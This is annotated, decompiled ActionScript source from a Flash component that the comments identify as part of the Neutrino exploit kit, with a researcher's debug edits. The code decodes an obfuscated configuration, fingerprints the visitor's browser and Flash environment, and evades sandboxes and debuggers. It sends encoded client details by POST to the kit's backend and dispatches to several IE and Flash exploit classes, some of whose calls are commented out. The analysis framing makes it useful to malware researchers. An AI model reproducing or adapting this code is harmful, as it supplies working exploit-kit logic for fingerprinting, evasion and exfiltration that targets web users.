package
{
   import flash.display.MovieClip;
   import flash.utils.ByteArray;
   import flash.events.Event;
   import package_2.class_7;
   import package_1.class_6;
   import package_1.class_8;
   import package_1.class_3;
   import package_1.class_4;
   import package_1.class_5;
   import flash.external.ExternalInterface;
   import package_0.class_2;
   import flash.text.Font;
   import flash.system.Capabilities;
   import flash.net.URLRequest;
   import flash.net.URLLoader;
   
   public final class class_1 extends MovieClip
   {
       
      private var var_6:String;
      
      private var var_1:Object;
      
      private var var_2:Object;
      
      private var var_7:ByteArray;
      
      public function class_1()
      {
         super();
      }
      
      public final function et(param1:ByteArray) : void
      {
         this.var_7 = param1;
		 //debug -- Just call the sucker.  We no haz stage.
		 this.method_3();
         if(stage)
         {
            this.method_3();
         }
         else
         {
            addEventListener("addedToStage",this.method_3);
         }
      }
      
	  // Function runs various checks and quits (returns) if certain characeristics are not met
      private final function method_3(param1:Event = null) : void
      {
         var _loc2_:* = null;
         removeEventListener("addedToStage",this.method_3);
         this.var_6 = "ecgovarkwmt627701";
		 //debug
         /*if(false === this.method_9())		// Do we have ExternalInterface available? Can we run JS?
         {
            return;
         }*/
         this.method_6();					// Call method_6 to fill var_1 with client attributes/capabilities
         if(false === this.method_8())		// Decode method_3 param into var_2 and check to see if we should run
         {
            return;
         }
		 if(false === this.method_10())		// Check to see if we're in a debugging environment
         {
            this.method_12();	// Are we possibly debugging? Send client info to backend and exit.
            return;
         }
         this.method_11();		// "Ping" backend, because we're about to rock!
         //debug
		 //if(true === this.var_2.debug.flash)	// derp
         //{
            //this.onSuccess(null,null);		// Are we debugging in Flash? If so, call onSuccess(null,null).
         //}
		 //debug
		 //this.onSuccess(null, null);
		 _loc2_ = new class_7(onSuccess,onFailed);	// LET'S DO THIS!!
		 //debug ^
         //else
         //{
            //_loc2_ = new class_7(onSuccess,onFailed);	// LET'S DO THIS!!
         //}
      }
      
      public final function onSuccess(param1:String, param2:int) : void
      {
		 //VBScript-based IE exploit #1
         //debug
		 //var _loc4_:class_6 = new class_6(this.var_2,this.var_1);
         //VBScript-based IE exploit #2
		 //var _loc3_:class_8 = new class_8(this.var_2, this.var_1);
		 //Flash Exploit #1
         //var _loc7_:class_3 = new class_3(this.var_2,this.var_1);
         //addChild(_loc7_);
		 //Flash Exploit #2
         //var _loc6_:class_4 = new class_4(this.var_2,this.var_1);
         //addChild(_loc6_);
		 //Flash Exploit #3
         //var _loc5_:class_5 = new class_5(this.var_2,this.var_1);
         //addChild(_loc5_);
		 // If we fail to exploit, send the browser back to the previous URL (prior to exploit)
         //debug
		 //if(false === _loc4_.method_1() && false === _loc3_.method_1() && false === _loc7_.method_1() && false === _loc6_.method_1() && false === _loc5_.method_1())
         //{
            //if("" != this.var_2.link.backUrl)
            //{
               //ExternalInterface.call("function (){ window.location = \'" + this.var_2.link.backUrl + "\'; }");
            //}
         //}
      }
      
	  // EK failed.  Call method_4 to send client enumeration details to backend.  Sneaky, sis.
      public final function onFailed(param1:String, param2:int) : void
      {
         this.var_1.marker = "browserInfo";
         this.var_1.softList = param1;
         this.var_1.timeDelta = param2;
         var _loc3_:ByteArray = new ByteArray();
         _loc3_.writeUTFBytes(this.method_5(this.var_1));
         _loc3_ = class_2.method_2(_loc3_,this.var_6);
         this.method_4(this.var_2.link.soft,_loc3_);
      }
      
	  // Functions returns flase if the ExternalInterface is available, and true if the interface is available
	  // i.e. Can we run JavaScript?
	  // http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/external/ExternalInterface.html
      private final function method_9() : Boolean
      {
         // available : Boolean [static] [read-only] Indicates whether this player is in a container that offers an external interface.
		 if(false === ExternalInterface.available)
         {
            return false;
         }
         return true;
      }
      
	  // Function checks to see if environment is:
	  // 	Phantom, NodeJS, CouchJS, Rhino, or a debugger
      private final function method_10() : Boolean
      {
         if(true === this.var_1.isPhantom)
         {
            return false;
         }
         if(true === this.var_1.isNodeJs)
         {
            return false;
         }
         if(true === this.var_1.isCouchJs)
         {
            return false;
         }
         if(true === this.var_1.isRhino)
         {
            return false;
         }
         if(true === this.var_1.isDebugger)
         {
            return false;
         }
         return true;
      }
      
	  // Function fills var_1 with client descriptors. Uses ExternalInterface.call for JS calls and Flash's Capabilities for Flash-based stats
	  // http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/Capabilities.html
      private final function method_6() : void
      {
         trace("Oh hai! We're enumerating the client here.");
		 //var _loc2_:String = String(ExternalInterface.call("function(){return window.navigator.appName;}"));
         //var _loc10_:String = String(ExternalInterface.call("function(){return window.navigator.appCodeName;}"));
         //var _loc5_:String = String(ExternalInterface.call("function(){return window.navigator.vendor;}"));
         //var _loc1_:Boolean = ExternalInterface.call("function(){return navigator.cookieEnabled;}");
         //var _loc9_:Boolean = ExternalInterface.call("function(){return !!window.callPhantom;}");
         //var _loc3_:Boolean = ExternalInterface.call("function(){return !!window.Buffer;}");
         //var _loc7_:Boolean = ExternalInterface.call("function(){return !!window.emit;}");
         //var _loc8_:Boolean = ExternalInterface.call("function(){return !!window.spawn;}");
         //var _loc4_:String = String(ExternalInterface.call("function(){return navigator.userAgent;}"));
         //var _loc6_:Boolean = ExternalInterface.call("function(){return /*@cc_on!@*/false || !!document.documentMode;}");
         //debug
		 //this.var_1 = {
            //"userAgent":_loc4_,
            //"cntFonts":Font.enumerateFonts(true).length,
            //"cpuArchitecture":Capabilities.cpuArchitecture,
            //"isDebugger":Capabilities.isDebugger,
            //"playerType":Capabilities.playerType,
            //"os":Capabilities.os,
            //"language":Capabilities.language,
            //"flashVer":Capabilities.version,
            //"screenColor":Capabilities.screenColor,
            //"screenDPI":Capabilities.screenDPI,
            //"screenResolutionX":Capabilities.screenResolutionX,
            //"screenResolutionY":Capabilities.screenResolutionY,
            //"supports32BitProcesses":Capabilities.supports32BitProcesses,
            //"supports64BitProcesses":Capabilities.supports64BitProcesses,
            //"externalInterface":ExternalInterface.available,
            //"isIe":_loc6_,
            //"cookieEnabled":_loc1_,
            //"appName":_loc2_,
            //"appCodeName":_loc10_,
            //"vendor":_loc5_,
            //"isPhantom":_loc9_,
            //"isNodeJs":_loc3_,
            //"isCouchJs":_loc7_,
            //"isRhino":_loc8_
         //};
		 this.var_1 = {
            "userAgent":"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
            "cntFonts":10,
            "cpuArchitecture":"x86",
            "isDebugger":false,
            "playerType":"ActiveX",
            "os":"Windows 8.1",
            "language":"en",
            "flashVer":"WIN 9,0,0,0",
            "screenColor":"color",
            "screenDPI":"1080",		// not sure about this one
            "screenResolutionX":"1024",
            "screenResolutionY":"768",
            "supports32BitProcesses":true,
            "supports64BitProcesses":true,
            "externalInterface":true,
            "isIe":false,
            "cookieEnabled":true,
            "appName":"Netscape",
            "appCodeName":"IE11",
            "vendor":"Microsoft",
            "isPhantom":false,
            "isNodeJs":false,
            "isCouchJs":false,
            "isRhino":false
         };
      }
      
	  // Function decodes strings and fills var_2, based on ByteArray passed to 2nd stage SWF
	  // var_6 is set earlier in the code -- this.var_6 = "ecgovarkwmt627701";
      private final function method_8() : Boolean
      {
         var _loc2_:* = null;
         var _loc4_:ByteArray = new ByteArray();
         var _loc5_:String = this.var_6;
         if(0 === _loc5_.length)	// length = 17
         {
            return false;
         }
         var _loc1_:int = 0;
         var _loc3_:ByteArray = new ByteArray();
         _loc3_ = this.var_7;	// This is the ByteArray passed to method_3
         _loc2_ = _loc3_.readUTFBytes(3);
         _loc1_ = parseInt(_loc2_,16);
         _loc4_.writeBytes(_loc3_,3,_loc1_);
         _loc4_ = class_2.method_2(_loc4_,_loc5_);
         this.var_2 = JSON.parse(_loc4_.toString());
         if("rtConfig" !== this.var_2.marker)
         {
            return false;
         }
         return true;
      }
      
	  // Function calls a "ping" back to the backend to say "we're about to rock"
      private final function method_11() : void
      {
         if(false === this.var_2.debug.flashPing)
         {
            return;
         }
         //debug -- Don't ping back :)
		 /*ExternalInterface.call("function(){var pImg = new Image(); pImg.src= \'" + 
		  * this.var_2.link.jsPing + "\';}");
		  * */
      }
      
	  // Function enumerates the client and pushes back a string with all client details
      private final function method_5(param1:Object) : String
      {
         var _loc3_:* = null;
         var _loc2_:* = [];
         var _loc6_:int = 0;
         var _loc5_:* = param1;
         for(var _loc4_ in param1)	// Loop through each ExternalInterface and enumerate issues
         {
            if(param1[_loc4_] is String)
            {
               _loc2_.push("\"" + _loc4_ + "\":\"" + param1[_loc4_] + "\"");
            }
            if(param1[_loc4_] is Boolean)
            {
               _loc2_.push("\"" + _loc4_ + "\":" + param1[_loc4_]);
            }
            if(param1[_loc4_] is int)
            {
               _loc2_.push("\"" + _loc4_ + "\":" + param1[_loc4_]);
            }
            if(param1[_loc4_] == null)
            {
               _loc2_.push("\"" + _loc4_ + "\":null");
            }
         }
         _loc3_ = _loc2_.join(",");
         _loc3_ = "{" + _loc3_ + "}";
         return _loc3_;
      }
      
	  // We're in a debugging interface! Let's report on the client.  Like a chump.  Dick.
      private final function method_12() : void
      {
         var _loc1_:ByteArray = new ByteArray();
         this.var_1.marker = "browserInfo";
         _loc1_.writeUTFBytes(this.method_5(this.var_1));
         _loc1_ = class_2.method_2(_loc1_,this.var_6);
         this.method_4(this.var_2.link.bot,_loc1_);		// Report client details back to the backend
      }
      
	  // Function POSTs data back to the Neutrino backend
      private final function method_4(param1:String, param2:ByteArray) : void
      {
         var _loc4_:URLRequest = new URLRequest(param1);
         var _loc3_:URLLoader = new URLLoader();
         _loc4_.contentType = "application/octet-stream";
         _loc4_.method = "POST";
         _loc4_.data = param2;
         try
         {
            _loc3_.load(_loc4_);	// Attempt to POST data back to backend
            return;
         }
         catch(error:ArgumentError)
         {
            return;
         }
         catch(error:SecurityError)
         {
            return;
         }
      }
   }
}
